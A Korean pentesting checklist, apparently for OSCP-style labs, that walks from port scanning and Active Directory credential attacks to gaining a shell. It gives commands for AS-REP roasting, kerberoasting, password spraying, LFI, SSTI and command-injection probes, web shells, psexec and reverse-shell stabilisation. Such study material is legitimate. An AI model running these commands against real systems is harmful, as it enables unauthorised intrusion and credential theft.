# 열거 → 첫 셸 통합 체크리스트 (단일 Linux/Windows + AD)

> 이 구간에서 마비되면 이 파일만 편다. 변수: `T`(타깃) `tun0IP`

---

## 0. 마비 방지 — 사고방식 (제일 중요)

- **목표를 좁혀라:** "셸"이 아니라 → **단일 = 취약한 문(서비스) 하나** / **AD = 첫 크리덴셜 하나**
- **넓은 질문 금지** ("전체를 어떻게 뚫지") → **좁은 질문 반복** ("이 포트가 뚫리나?")
- **막히면 = 기법 부족이 아니라 열거가 얕은 것** (7번으로)
- 모든 서비스에 **두 반사**: ① 버전 보이면 → `searchsploit` ② 입력/기능 있으면 → 취약점 클래스

---

## 1. 스캔 (항상 먼저)

```bash
nmap -p- --min-rate 5000 T -oN all.txt          # 전체 TCP
nmap -sC -sV -p <열린포트> T -oN svc.txt         # 정밀
sudo nmap -sU --top-ports 100 T                 # UDP (SNMP 놓치지 말 것)
```

**포트로 박스 유형 판단:** `88/389/445/5985` → AD(DC) / `8080·8000·high http` → 웹 / `445만 + 웹없음` → SMB 파고들기

---

## 2. 포트별 두드리기 (유한 목록 — 위→아래 훑기)

|포트|첫 수|
|---|---|
|**80/443/8080 웹**|→ 3번 (단일 foothold #1)|
|**22 SSH**|크리덴셜 필요 (웹/파일서 얻어옴) / 약한비번 / 유출 키|
|**21 FTP**|`ftp T`(anonymous) → 웹루트 업로드 / 파일 읽기|
|**139/445 SMB**|`enum4linux-ng -A T` / `smbmap -H T -u anonymous` / `nmap -p445 --script smb-vuln* T`(MS17-010)|
|**389 LDAP**|`ldapsearch -x -H ldap://T -b "dc=x,dc=y"` (익명 바인드)|
|**161/udp SNMP**|`snmpwalk -v2c -c public T`|
|**1433 MSSQL / 3306 MySQL / 6379 Redis**|기본·무인증 접속 → 크리덴셜/RCE|
|**3389 RDP / 5985 WinRM**|크리덴셜 필요 (확보 후 evil-winrm/xfreerdp)|
|**낯선 고포트**|배너 뽑아 **그대로 검색** + `searchsploit` (예: 4505 ZMTP→SaltStack)|

## 3. 웹 심화 (단일 Linux/Windows foothold 70%)

```bash
whatweb http://T ; curl -s http://T | head   # 앱·CMS·버전·기술 식별
feroxbuster -u http://T -w raft-medium-directories.txt -x php,txt,html -t 50
#Windows/IIS면 → -x aspx,asp,html  (php 버리기)
```

**갈림길:**

- **알려진 앱/CMS/버전** → `searchsploit <앱> <버전>` / `wpscan --url http://T --enumerate u,vp`
- **커스텀 앱** → 취약점 클래스 순회: `기본자격증명 → 파일업로드(.php/.phtml/.aspx, .htaccess) → LFI(?file=../../etc/passwd, php filter) → SQLi(수동) → SSTI({{7*7}}=49?) → 명령주입(;id) → 인증우회`

## 4. AD Foothold — 첫 크리덴셜 7가지 (자격증명 없이, 다 훑기)

```
□ AS-REP Roast     impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC -request  (→18200)
□ 익명 SMB 공유     smbmap -H DC -u anonymous  → 파일 속 크리덴셜(config/xml/txt)
□ 익명 LDAP        ldapsearch ... → user description에 비번
□ 웹앱             기본자격증명 / 업로드 / LFI / SSRF / SQLi
□ 강제인증          쓰기공유에 ntlm_theft .lnk + impacket-smbserver (Responder 포이즌 금지!) →5600
□ 패스워드 스프레이   nxc smb DC -u users.txt -p 'Season2026!' --continue-on-success (락아웃 --pass-pol 먼저)
□ SNMP/FTP/서비스   snmpwalk / 익명FTP / 서비스 버전 익스
```

**사용자 리스트 만들기:** 웹 직원명단 → `username-anarchy -i names.txt` → `kerbrute userenum -d DOMAIN --dc DC`

## 6. 크리덴셜 얻은 뒤 → 셸 전환 (스윕)

**두 리스트 계속 갱신:** `users.txt`(모든 사용자) · `creds.txt`(모든 비번/해시)

```bash
#어디에 먹히나 + 어디서 admin (프로토콜 스윕)
nxc smb T -u users.txt -p creds.txt --continue-on-success --no-bruteforce   # (Pwn3d!)=admin
for p in smb winrm rdp ssh; do nxc $p T -u USER -p PASS; done
#AD: 서비스 계정은 kerberoast로
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request     # →13100
```

**셸 획득 수단:**

```bash
evil-winrm -i T -u USER -p PASS            # WinRM(5985) = 셸
impacket-psexec DOMAIN/USER:PASS@T         # SMB admin = 셸
ssh USER@T                                 # Linux 재사용
impacket-mssqlclient ... → enable_xp_cmdshell → 셸
#웹셸 업로드(.php/.aspx) → ?cmd= → 리버스셸
```

> 핵심: **크리덴셜 = 셸.** WinRM 되면 셸, SMB admin이면 셸, SSH 재사용이면 셸.

## 7. 막혔다 = 열거를 더 깊게 (기법 찾지 말 것)

```
□ 전체 포트(-p-) + UDP 다시 스캔 (웹이 8080에? SNMP 있나?)
□ 다른 워드리스트로 디렉토리 재시도 / -s 200 같은 과한 필터 제거
□ vhost·서브도메인·robots.txt·소스 주석
□ 낯선 포트/배너 = 버리지 말고 그대로 검색 + hacktricks <포트>
□ 크리덴셜 하나라도 있으면 → 모든 서비스에 재사용
```

## 부록. 셸 던지기 반사

- **셸 전 OS 확인:** Windows=nc.exe/PowerShell, Linux=bash
- **리버스셸 안 붙으면:** staged/stageless 불일치 → `shell_reverse_tcp`(stageless)
- **셸 잡으면 즉시 안정화:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `stty raw -echo; fg`
